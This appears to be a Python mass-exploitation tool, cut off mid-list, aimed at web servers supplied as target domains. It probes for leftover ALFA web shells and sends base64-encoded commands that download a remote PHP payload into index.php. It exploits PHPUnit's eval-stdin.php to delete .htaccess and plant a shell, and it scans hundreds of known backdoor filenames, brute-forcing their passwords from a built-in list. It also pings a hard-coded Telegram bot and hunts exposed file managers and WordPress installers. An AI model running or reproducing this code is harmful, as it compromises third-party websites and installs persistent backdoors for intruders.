import requests
from queue import Queue
from threading import Thread
import os
import getpass
import multiprocessing
import json
from rich import print as prints
from rich.panel import Panel
import concurrent.futures
import warnings
import os,requests,random,threading,time,sys,ctypes,re,urllib3
from threading import *
from multiprocessing.dummy import Pool,Lock
from urllib.request import urlopen
from requests import post
from bs4 import BeautifulSoup
from random import choice
from colorama import Fore,Style,init
init(autoreset=True)

fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings('ignore', category=InsecureRequestWarning)

def remove_duplicates(input_file,output_file):
    with open(input_file, "r") as file:
        lines = file.readlines()
        unique_lines = set(lines)
        with open(output_file, "w") as file:
            file.writelines(unique_lines)
            
def alfa(i) :
    global Good
    x = requests.session()
    head={
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    }
    listaa = ['/alfacgiapi','/ALFA_DATA/alfacgiapi','/assets/alfacgiapi','/assets/ALFA_DATA/alfacgiapi','/upload/alfacgiapi','/upload/ALFA_DATA/alfacgiapi','/uploads/alfacgiapi','/uploads/ALFA_DATA/alfacgiapi','/assets/upload/alfacgiapi','/assets/upload/ALFA_DATA/alfacgiapi','/assets/uploads/alfacgiapi','/assets/uploads/ALFA_DATA/alfacgiapi','/wp-content/alfacgiapi','/wp-content/ALFA_DATA/alfacgiapi''/wp-content/uploads/alfacgiapi','/wp-content/uploads/ALFA_DATA/alfacgiapi','/wp-content/plugins/alfacgiapi','/wp-content/plugins/ALFA_DATA/alfacgiapi','/wp-content/themes/alfacgiapi','/wp-content/themes/ALFA_DATA/alfacgiapi','/wp-content/upgrade/alfacgiapi','/wp-content/upgrade/ALFA_DATA/alfacgiapi','/wp-content/updraft/alfacgiapi','/wp-content/updraft/ALFA_DATA/alfacgiapi','/wp-content/plugins/library/alfacgiapi','/wp-content/plugins/library/ALFA_DATA/alfacgiapi','/wp-admin/alfacgiapi','/wp-admin/ALFA_DATA/alfacgiapi','/wp-includes/alfacgiapi','/wp-includes/ALFA_DATA/alfacgiapi','/.well-known/alfacgiapi','/.well-known/ALFA_DATA/alfacgiapi','/.well-known/acme-challenge/alfacgiapi','/.well-known/acme-challenge/ALFA_DATA/alfacgiapi','/.well-known/pki-validation/alfacgiapi','/.well-known/pki-validation/ALFA_DATA/alfacgiapi','/.tmb/alfacgiapi','/.tmb/ALFA_DATA/alfacgiapi','/.quarantine/alfacgiapi','/.quarantine/ALFA_DATA/alfacgiapi','/cgi-bin/alfacgiapi','/cgi-bin/ALFA_DATA/alfacgiapi','/images/alfacgiapi','/images/ALFA_DATA/alfacgiapi','/components/alfacgiapi','/components/ALFA_DATA/alfacgiapi','/wordpress/alfacgiapi','/wordpress/ALFA_DATA/alfacgiapi','/wp/alfacgiapi','/wp/ALFA_DATA/alfacgiapi','/blog/alfacgiapi','/blog/ALFA_DATA/alfacgiapi','/new/alfacgiapi','/new/ALFA_DATA/alfacgiapi','/old/alfacgiapi','/old/ALFA_DATA/alfacgiapi','/backup/alfacgiapi','/backup/ALFA_DATA/alfacgiapi']
    for xox in listaa :
        try :
            url = ("http://"+i+xox+"/perl.alfa")
            url2 = ("http://"+i+xox+"/bash.alfa")
            url3 = ("http://"+i+xox+"/py.alfa")
            check = ("http://"+i+xox+"/index.php?bx=0e215962017")
            check2 = ("http://"+i+xox+"/radio.php?bx=0e215962017")
            check3 = ("http://"+i+xox+"/404.php?bx=0e215962017")
            x.post(url, headers=head, data={'cmd': 'd2dldCAtcU8gaW5kZXgucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vdnJ0aG5rbmcvY29rL21haW4vdXA='}, timeout=15)
            x.post(url, headers=head, data={'cmd': 'Y3VybCAtTHMgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL292cnRobmtuZy9jb2svbWFpbi91cCB8IHRlZSAtYSBpbmRleC5waHA='}, timeout=15)
            x.post(url2, headers=head, data={'cmd': 'd2dldCAtcU8gcmFkaW8ucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vdnJ0aG5rbmcvY29rL21haW4vdXA='}, timeout=15)
            x.post(url2, headers=head, data={'cmd': 'Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb3ZydGhua25nL2Nvay9tYWluL3VwIC1vIHJhZGlvLnBocA=='}, timeout=15)
            x.post(url3, headers=head, data={'cmd': 'Y3VybCAtTHMgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL292cnRobmtuZy9jb2svbWFpbi91cCB8IHRlZSAtYSA0MDQucGhw'}, timeout=15)
            x.post(url3, headers=head, data={'cmd': 'd2dldCAtcU8gNDA0LnBocCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb3ZydGhua25nL2Nvay9tYWluL3Vw'}, timeout=15)
            req1 = x.get(check, headers=head, timeout=15)
            if "NomiSec07-Tech" in req1.text :
                Good = Good + 1
                print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found ALFA RCE")
                open("result/shell.txt","a").write(check+"\n")
                break
            req2 = x.get(check2, headers=head, timeout=15)
            if "NomiSec07-Tech" in req2.text :
                Good = Good + 1
                print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found ALFA RCE")
                open("result/shell.txt","a").write(check2+"\n")
                break
            req3 = x.get(check3, headers=head, timeout=15)
            if "NomiSec07-Tech" in req3.text :
                Good = Good + 1
                print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found ALFA RCE")
                open("result/shell.txt","a").write(check3+"\n")
                break
            else :
                print(fw+"["+fr+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fr+" Not Found ALFA RCE")
        except :
            pass

def roxy(i) : 
    x = requests.session()
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    listaa = ['/assets/editor/fileman/dev.html','/assets/editor/fileman/index.html','/js/fileman/dev.html','/js/fileman/index.html','/fileman/index.html','/fileman/dev.html','/lib/fileman/index.html','/lib/fileman/dev.html','/admin/fileman/index.html','/admin/fileman/dev.html']
    for xox in listaa :
        try :
            url = ("http://"+i+xox)
            r = x.get(url, headers=head, timeout=15, verify=False)
            if "Roxy file manager" in r.text :
                print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found RFM")
                open("result/RFM.txt","a").write(url+"\n")
                break
            else :
                print(fw+"["+fr+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fr+" Not Found RFM")
        except :
            pass

def wpins(i) : 
    x = requests.session()
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    listaa = ['/wp-admin/install.php','/wp/wp-admin/install.php','/wordpress/wp-admin/install.php','/blog/wp-admin/install.php','/new/wp-admin/install.php','/test/wp-admin/install.php','/old/wp-admin/install.php','/backup/wp-admin/install.php']
    for xox in listaa :
        try :
            url = ("http://"+i+xox)
            req = x.get(url, headers=head)
            if "<title>WordPress &rsaquo; Setup Configuration File</title>" in req.text and '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>' in req.text :
                print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found WpSetup")
                open("result/WpSetUp.txt","a").write(url+"\n")
                break
            elif "<title>WordPress &rsaquo; Installation</title>" in req.text and '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>' in req.text :
                print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found WpInstall")
                open("result/WpInstall.txt","a").write(url+"\n")
                break
            else :
                print(fw+"["+fr+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fr+" Not Found WPI/WPS")
        except :
            pass

def rsf(i) : 
    global Good
    x = requests.session()
    head = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0', 
    'Upgrade-Insecure-Requests': '1', 
    'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
    'Accept-Encoding': 'gzip, deflate', 
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 
    'referer': 'www.google.com'
    }
    try :
        listaa = ['un.php','foxx.php','wawe.php','js.php?get','phpinfo.php?re@=vo@','wp-email.php','wp-booking.php','fierza.php','load.php','wp-content/themes/fitnessbase/dev.php','wp-content/themes/fitnessbase/crp.php','alpha.php','tinyfilemanager.php','filemanager.php','manager.php','wp-content.php','wp-content/themes/alera/alpha.php','wp-content/plugins/wp-diambar/includes/loadme.php','lock360.php?daksldlkdsadas=1','5.php','01.php','.well-known/pki-validation/wp-signup.php','.well-known/wp-signup.php','jindex.php','0o.php','ciis.php','zfox.php','zf.php','room.php','xd.php','adriv.php','gecko.php','tonant.php','b.php','xleet-shell.php','4mosan.php','cong.php','config.php','wp-key.php','wp-conctent.php','flame.php','wp-content/flame.php','block-patwp.php','bre.php','lx.php','991176.php','ffAA531.php','wp-help.php','un.php?f=f','un2.php?f=f','wp-posts.php','xl.php','ww.php','testwp.php?wp=1','kyami.php','wp-includes/class-wp-other.php','unknown.php','1975.phP','Mo2AaAaAaPrivateShell.php','god4m.php','tuco.php','x.php','w.php','shl.php','wp-class.php','info.php','o.php','shx.php','l.php','hi.php','readme.php','pi.php','wp-content/themes/noriumportfolio/img_screen.php','wp-content/themes/noriumportfolio/doc.php','wp-content/themes/noriumportfolio/alpha.php','wp-content/themes/noriumportfolio/db.php?u','wp-content/themes/seotheme/db.php?u','wp-content/themes/seotheme/mar.php','wp-content/themes/skatepark/alpha.php','wp-content/themes/skatepark/img_screen.php','wp-content/themes/skatepark/db.php?u','wp-content/themes/skatepark/doc.php','wp-content/plugins/db/mar.php','wp-content/themes/wp-pridmag/22x.php','wp-content/plugins/ndak/1.php','wp-content/plugins/ndak/marijuana.php','wp-content/themes/workart/db.php?u','wp-content/plugins/cakil/up.php','wp-content/plugins/cache-wordpress/wp-activates.php','wp-content/plugins/cache-wordpress/payment.php','wp-content/plugins/cekidot/readme.txt','wp-content/plugins/cekidot/mar.php','wp-content/themes/workart/doc.php','wp-content/themes/theme/gr.php','wp-content/themes/pridmag/init.php','wp-content/themes/jobart/db.php?u','wp-content/themes/jobart/doc.php','wp-content/themes/cepair/doc.php','wp-content/themes/cakiltheme/up.php','wp-content/themes/cakiltheme/idx.php','wp-content/themes/wp-pridmag/status.php','wp-content/themes/wp-pridmag/up.php','wp-content/themes/wp-pridmag/init.php','wp-content/themes/rishi/doc.php','wp-content/plugins/linkpreview/db.php?u','wp-content/themes/rishi/db.php?u','wp-content/plugins/virr/v.php','wp-content/themes/pridmag/db.php?u','wp-content/plugins/virr/uploader.php?uploader','wp-content/plugins/db/uploader.php?uploader','wp-content/plugins/wp-freeform/wawe.php','wp-content/plugins/wp-freeform/includes/loadme.php','wp-content/plugins/wp-freeform/style.php','?loadme','galekjaya.php?raimu=tgl99','r00t.php','Xzd.php','radio.php?pass=shell','content.php','about.php','admin.php','css.php','doc.php','wp_wrong_datlib.php','v.php','ups.php','up.php','fw.php','loader/ff.php?pass=shell','local.php','wp-atom.php','1index.php?pass=shell','2index.php?pass=shell','3index.php?f=NmRtJOUjAdutReQjscRjKUhleBpzmTyO.txt','wikindex.php?f=NmRtJOUjAdutReQjscRjKUhleBpzmTyO.txt','autoload_classmap.php','wp-conflg.php','wp-admin/includes/1975.php','wp-backup-sql-302.php','wp-includes/wp-class.php','wp-inlcudes.php?katib','wp-js.php?phpshells','wp-load.php?daksldlkdsadas=1','sys.php','0.php','0byte.php','0x0.php','0z.php','1.php','13.php','1877.php','1975.php?CVE=2022','1975.php?CVE=2021','1975.php','1975Team.php?shell=Dead','403.php','404.php','45.php','4x4.php','73.php','a.php','abc.php','al.php','alf.php','alf4.php','alfa-ioxi.php','alfa-shell-v4.php','alfa.php','alfakun.php','alfatesla.php','alfateslav4.php','alwso.php','anjay.php','anon.php','anons79.php','base.php','batm.php','bj.php','black.php','blog/wp-includes/fonts/dev.php','blog/wp-includes/fonts/iqb.php','by.php','byp.php','bypas.php','bypass.php','byps.php','c.php','ccaef.php','chitoge.php','codeboy1877x.php','con.php','con7.php','con7ext.php','dbx.php','defau1t.php','degeselih.php','dev.php','docindex.php','dosya.php','Dz.php','e.php','error.php?phpshells','evil.php','file.php','fox.php','FoxWSO-full.php','FoxWSO.php','foxwso.php','gank.php','gank.php.PhP','gel4y.php','gelay.php','gh.php','hehe.php','i.php','id.php','ids.php','idx.php','indoxploit.php','init.php','ioxi.php','iq.php','iqb.php','k.php','kepo.php','kk.php','kndw1.php','la.php','lnedx.php','lol.php','lolzk.php','m.php','mar.php','marijuana.php','mas.php','mass.php','mclash.php','mi.php','min.php','mini.php','minik.php','minishell.php','mrjn.php','n.php','new-index.php','ninja.php','ohayo.php','old-index.php?daksldlkdsadas=1','olux.php','postfs.php','pref.php','priv.php','priv8.php','qindex.php','r.php','r57.php','rex.php','root.php','s.php','shell.php','shell20211028.php','shells.php','sql.php','srx.php','sym.php','sym403.php','t.php','tes.php','tesla.php','teslav.php','test.php','tshop.php','twin.php','u.php','upload.php','uploader.php','usb.php','usr.php','utchiha.phP','v3.php','v4.php','vuln.php','w3llstore.php','wp-2019.php','wp-admin.php','wp-content/mu-plugins-old/index.php','wp-content/themes/twentytwentytwo/index.php','wp-defaul.php','wp-includes/fonts/dev.php','wp-includes/fonts/iq.php','wp-includes/fonts/iqb.php','wp-info.php','wp-mails.php','wp-one.php','wp-pluging.php','wp-plugins.php','wp-rss.php','wp-singupp.php','wp-site.php','wp-system.php','wp-title.php','wp-we.php','wp.php','wp/wp-includes/fonts/dev.php','wp/wp-includes/fonts/iqb.php','wpindex.php','ws.php','wsanon.php','WSO.php','wso.php','wso1.php','wso1337.php','wso2.php','xcv.php','xidcm.php','xindex.php','xleet.php','xm.php','xx.php','XxX.php','xxx.php','y.php','z.php','zk.php','zone.php?phpshell','zx.php','symlink.php','c99.php','ok.php','2.php','3.php','4.php','6.php','7.php','8.php','9.php','10.php','p.php','q.php','d.php','f.php','g.php','h.php','j.php','wp-wso.php','minimo.php','V3.php','V5.php','www.php','100.php','777.php','xox.php','new.php','wi.php','nee.php','87.php','haxor.php','FoxWSOv1.php','bb.php','lf.php','hello.php','if.php','kn.php','3301.php','anone.php','wp-configer.php','wp-ad.php','send.php','.wp-cache.php','sendmail.php','rahma.php','nasgor.php','alfa123.php']
        for xox in listaa :
            url = ("http://"+i+"/"+xox)
            url2 = ("https://"+i+"/"+xox)
            req = x.get(url, headers=head, timeout=7, verify=False).text
            req = x.get(url2, headers=head, timeout=7, verify=False).text
            if "border:none;background-color:#1e252e;color:#fff;cursor:pointer;" in req or "name='watching' value='submit'" in req or "name='watching' value='>>'" in req or "<form method=post><input type=password name=pass>" in req or "<input type=password name=pass><input type=submit" in req or "method=post>Password:" in req :
                print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found Shell")
                x.post('https://api.telegram.org/bot5874880100:AAHKOb5XPn7PjAIg3WJ8x9Asc539cOM1m_Y/sendMessage?chat_id=1357193581&text=hai')
                open("result/shellpw.txt","a").write(url+"\n")
                listpw = ['admin','stusa','xleet','x505','damedesuyo8800','am*guAW8.ryDgz-TYF','Stusa','friv','fuck666','','****','*****','Haxor?1337','haxor','Haxor','imunify1337','Malyo1@8','31337','00w1wcRT','022627raflixsec','123','123456','12qwaszx','1337','133721','1n73ction','22XC','404','555','731','a5e8z77','abcder','achan','adminhoki','aerul','akudimana','alfa','anggie21','AnonGhost','AnonymousFox','asdsdggenu','awokawok2','b374k','b3t4kun','BangPat?1337','banyumas','bheart2206','cantik','cmonqwe123#@!','con7extshell','cyb3r','DapsquaD','DeadSec','default','elena','fff132f70f28194','G00DV1N','geronimo123','gfus','ghost287','HACKED','hacker0882','hackmeDON','Hasilhoki','haurgeulis','haxor34','huypizdaprovoda','hxr1337','iamtheking','IndexAttacker','IndoSec','IndoXploit','JH23FVDG32FD','jupiter2709','katib','kem','kontolcokasu','kontolgaceng','kontoll471','kpxwbYBP4hQK','l o l','leksak98@','letmeinmobile','mad','memes','mini-shell','Mo2a0123','mravast','myrepublic','oppaidragon','password','peler','peler666','Penolong40','phpshell','phpshells','pucek12345','r00t','r00tsh3ll','rbbd95','RFkyy','root','root@kudajumping','Sandra@1199','sys123','T1KUS90T','tbl','thopik123','tunafeesh','w0rms','xmina','zaza','zeeblaxx','{ IndoSec }']
                for pw in listpw :
                    tor = ("http://"+i+"/"+xox+"#"+pw)
                    cek = x.post(url, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    cek = x.post(url2, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    cek = x.post(url, headers=head, data={'pass': pw, 'watching': '>>'}, timeout=7, verify=False).text
                    cek = x.post(url2, headers=head, data={'pass': pw, 'watching': '>>'}, timeout=7, verify=False).text
                    if "-rw-r--r--" in cek or ">File manager<" in cek or ">Upload file:" in cek or "drwxr-xr-x" in cek or "-rw-rw-rw-" in cek or "drwxrwxrwx" in cek or "Upload File :" in cek or "Writeable" in cek :
                        print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found Pass Shell")
                        open("result/shell.txt","a").write(url+"#"+pw+"\n")
                        open("result/shellcracked.txt","a").write(url+"#"+pw+"\n")
                        break
                    else :
                        print(fw+"["+fr+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fr+" Not Found Pass Shell")
                break
            elif ">File manager<" in req or "Cpanel Reset Password" in req or "WebRooT" in req or "PHP File Manager" in req or '<font color="red"><center> Shell :'in req or '<font color="green"><center> Up :' in req or "Haxgeno7" in req or "H3NING_MAL4M" in req or "?x=cmd&d=" in req or "aDriv4" in req or "<input type='submit' value='Submit'" in req or "Upload file :" in req or "uk45" in req or "-rwxrwxrwx" in req or "drwxr-x---" in req or "-rwxr-xr-x" in req or "#0x2525" in req or "#0x2515" in req or "-rw-rw-r--" in req or "Mini Shell" in req or "=== bbPress ===" in req or "Priv8 Home Root Uploader by Mrcakil" in req or "root@indoxploit" in req or "&mode=upload'>Upload file</a></td>" in req or "<input type=file name=f><input name=k type=submit id=k value=upload>" in req or 'name="_upl" type="submit" id="_upl" value="Upload"' in req or "trenggalek6etar" in req or "D3xterR00t" in req or "-r--r--r--" in req or "PHP Uploader - By Phenix-TN & Mr.Anderson" in req or '<option value="/tmp/">' in req or 'name="_upl"' in req and 'id="_upl"' in req and 'value="Upload"' in req or 'Sh3ll' in req or "Sh3ll By Anons79" in req or "CCAEF Uploader" in req or ">Upload file:" in req or "RevoLutioN Namesis" in req or "okokok" in req or 'value="Upload"></form>' in req or '<title>[ RC-SHELL' in req or '<option value="create_symlink">' in req or "Vuln!! patch it Now!" in req or "WSO 4.2.5<" in req or "Ghost Exploiter Team Official" in req or ">PHP File Manager<" in req or "1975 Team" in req or '&upload=gaskan">Upload File<' in req or 'name="_upl"' in req and 'id="_upl"' in req or "-rw-r--r--" in req or "drwxr-xr-x" in req or "-rw-rw-rw-" in req or "drwxrwxrwx" in req or "Owner/Group" in req or ">[ Home Shell ]<" in req or "Upload File : " in req or 'name="uploader" id="uploader"' in req or "l7WADead" in req or '<input type="submit" name="submit" value="Upload">' in req or "(Writeable)" in req or "NowMeee" in req :
                Good = Good + 1
                print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found Shell")
                
                open("result/shell.txt","a").write(url+"\n")
            else :
                print(fw+"["+fr+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fr+" Not Found Shell")
    except :
        pass

def phpunit(i) : 
    global Good
    head = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try :
        x = requests.session()
        listaa = ['/vendor/phpunit/phpunit/src/Util/PHP/','/laravel/vendor/phpunit/phpunit/src/Util/PHP/','/api/vendor/phpunit/phpunit/src/Util/PHP/','/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/','/modules/autoupgrade/vendor/phpunit/phpunit/src/Util/PHP/']
        for xox in listaa :
            url = ("http://"+i+xox+"eval-stdin.php")
            data = "<?php phpinfo(); ?>"
            cmd = x.get(url, data=data, timeout=15, verify=False)
            if "PHP License as published by the PHP Group" in cmd.text :
                print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found Phpunit")
                open("result/phpunit.txt","a").write(url+"\n")
                data2 = "<?php system('rm .htaccess') ?>"
                x.get(url, data=data2, timeout=15, verify=False)
                data3 = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTN3C8XR9mxKMjYCxjQ35FGjzvimsfBByNgQoJGNoLCBDVVJMTN3C8XR9mxKMjYCxjQ35FGjzvimsfBByNgk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTN3C8XR9mxKMjYCxjQ35FGjzvimsfBByNgKCWN1cmxfY2xvc2UoJGNoKTN3C8XR9mxKMjYCxjQ35FGjzvimsfBByNgoKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL292cnRobmtuZy9jb2svbWFpbi91cCIsImluZGV4LnBocCIpKSB7CgllY2hvICJCYW5kdW5nWHBsb2l0ZXIiOwp9IGVsc2UgewoJZWNobyAiZmFpbCI7Cn0KPz4=')); ?>"
                x.get(url, data=data3, timeout=15, verify=False)
                data4 = "<?php system('wget https://raw.githubusercontent.com/ovrthnkng/cok/main/up -qO index.php');"
                x.get(url, data=data4, timeout=15, verify=False)
                data5 = "<?php system('curl -s https://raw.githubusercontent.com/ovrthnkng/cok/main/up -o index.php');"
                x.get(url, data=data5, timeout=15, verify=False)
                url2 = ("http://"+i+xox+"index.php?bx=0e215962017")
                spawn = x.get(url2, headers=head)
                if "NomiSec07-Tech" in spawn.text:
                    Good = Good + 1
                    print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found Phpunit Shell")
                    open("result/shell.txt","a").write(url2+"\n")
                    break
                else :
                    print(fw+"["+fr+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fr+" Not Vuln Phpunit")
            else :
                print(fw+"["+fr+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fr+" Not Found Phpunit")
    except :
        pass

def exploit(i):
    try:
        alfa(i)
        rsf(i)
        phpunit(i)
        roxy(i)
        rfm(i)
        wpins(i)
        for item in listaa:
            pass
    except Exception as e:
        print(f"Terjadi kesalahan: {e}")
def exploit_wrapper(domain):
    exploit(domain)
#shell finder 
def shell_find(i) :
    global Good
    x = requests.session()
    head = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0', 
    'Upgrade-Insecure-Requests': '1', 
    'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
    'Accept-Encoding': 'gzip, deflate', 
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 
    'referer': 'www.google.com'
    }
    try :
        listaa = ['un.php','foxx.php','wawe.php','js.php?get','phpinfo.php?re@=vo@','wp-email.php','wp-booking.php','fierza.php','load.php','wp-content/themes/fitnessbase/dev.php','wp-content/themes/fitnessbase/crp.php','alpha.php','tinyfilemanager.php','filemanager.php','manager.php','wp-content.php','wp-content/themes/alera/alpha.php','wp-content/plugins/wp-diambar/includes/loadme.php','lock360.php?daksldlkdsadas=1','5.php','01.php','.well-known/pki-validation/wp-signup.php','.well-known/wp-signup.php','jindex.php','0o.php','ciis.php','zfox.php','zf.php','room.php','xd.php','adriv.php','gecko.php','tonant.php','b.php','xleet-shell.php','4mosan.php','cong.php','config.php','wp-key.php','wp-conctent.php','flame.php','wp-content/flame.php','block-patwp.php','bre.php','lx.php','991176.php','ffAA531.php','wp-help.php','un.php?f=f','un2.php?f=f','wp-posts.php','xl.php','ww.php','testwp.php?wp=1','kyami.php','wp-includes/class-wp-other.php','unknown.php','1975.phP','Mo2AaAaAaPrivateShell.php','god4m.php','tuco.php','x.php','w.php','shl.php','wp-class.php','info.php','o.php','shx.php','l.php','hi.php','readme.php','pi.php','wp-content/themes/noriumportfolio/img_screen.php','wp-content/themes/noriumportfolio/doc.php','wp-content/themes/noriumportfolio/alpha.php','wp-content/themes/noriumportfolio/db.php?u','wp-content/themes/seotheme/db.php?u','wp-content/themes/seotheme/mar.php','wp-content/themes/skatepark/alpha.php','wp-content/themes/skatepark/img_screen.php','wp-content/themes/skatepark/db.php?u','wp-content/themes/skatepark/doc.php','wp-content/plugins/db/mar.php','wp-content/themes/wp-pridmag/22x.php','wp-content/plugins/ndak/1.php','wp-content/plugins/ndak/marijuana.php','wp-content/themes/workart/db.php?u','wp-content/plugins/cakil/up.php','wp-content/plugins/cache-wordpress/wp-activates.php','wp-content/plugins/cache-wordpress/payment.php','wp-content/plugins/cekidot/readme.txt','wp-content/plugins/cekidot/mar.php','wp-content/themes/workart/doc.php','wp-content/themes/theme/gr.php','wp-content/themes/pridmag/init.php','wp-content/themes/jobart/db.php?u','wp-content/themes/jobart/doc.php','wp-content/themes/cepair/doc.php','wp-content/themes/cakiltheme/up.php','wp-content/themes/cakiltheme/idx.php','wp-content/themes/wp-pridmag/status.php','wp-content/themes/wp-pridmag/up.php','wp-content/themes/wp-pridmag/init.php','wp-content/themes/rishi/doc.php','wp-content/plugins/linkpreview/db.php?u','wp-content/themes/rishi/db.php?u','wp-content/plugins/virr/v.php','wp-content/themes/pridmag/db.php?u','wp-content/plugins/virr/uploader.php?uploader','wp-content/plugins/db/uploader.php?uploader','wp-content/plugins/wp-freeform/wawe.php','wp-content/plugins/wp-freeform/includes/loadme.php','wp-content/plugins/wp-freeform/style.php','?loadme','galekjaya.php?raimu=tgl99','r00t.php','Xzd.php','radio.php?pass=shell','content.php','about.php','admin.php','css.php','doc.php','wp_wrong_datlib.php','v.php','ups.php','up.php','fw.php','loader/ff.php?pass=shell','local.php','wp-atom.php','1index.php?pass=shell','2index.php?pass=shell','3index.php?f=NmRtJOUjAdutReQjscRjKUhleBpzmTyO.txt','wikindex.php?f=NmRtJOUjAdutReQjscRjKUhleBpzmTyO.txt','autoload_classmap.php','wp-conflg.php','wp-admin/includes/1975.php','wp-backup-sql-302.php','wp-includes/wp-class.php','wp-inlcudes.php?katib','wp-js.php?phpshells','wp-load.php?daksldlkdsadas=1','sys.php','0.php','0byte.php','0x0.php','0z.php','1.php','13.php','1877.php','1975.php?CVE=2022','1975.php?CVE=2021','1975.php','1975Team.php?shell=Dead','403.php','404.php','45.php','4x4.php','73.php','a.php','abc.php','al.php','alf.php','alf4.php','alfa-ioxi.php','alfa-shell-v4.php','alfa.php','alfakun.php','alfatesla.php','alfateslav4.php','alwso.php','anjay.php','anon.php','anons79.php','base.php','batm.php','bj.php','black.php','blog/wp-includes/fonts/dev.php','blog/wp-includes/fonts/iqb.php','by.php','byp.php','bypas.php','bypass.php','byps.php','c.php','ccaef.php','chitoge.php','codeboy1877x.php','con.php','con7.php','con7ext.php','dbx.php','defau1t.php','degeselih.php','dev.php','docindex.php','dosya.php','Dz.php','e.php','error.php?phpshells','evil.php','file.php','fox.php','FoxWSO-full.php','FoxWSO.php','foxwso.php','gank.php','gank.php.PhP','gel4y.php','gelay.php','gh.php','hehe.php','i.php','id.php','ids.php','idx.php','indoxploit.php','init.php','ioxi.php','iq.php','iqb.php','k.php','kepo.php','kk.php','kndw1.php','la.php','lnedx.php','lol.php','lolzk.php','m.php','mar.php','marijuana.php','mas.php','mass.php','mclash.php','mi.php','min.php','mini.php','minik.php','minishell.php','mrjn.php','n.php','new-index.php','ninja.php','ohayo.php','old-index.php?daksldlkdsadas=1','olux.php','postfs.php','pref.php','priv.php','priv8.php','qindex.php','r.php','r57.php','rex.php','root.php','s.php','shell.php','shell20211028.php','shells.php','sql.php','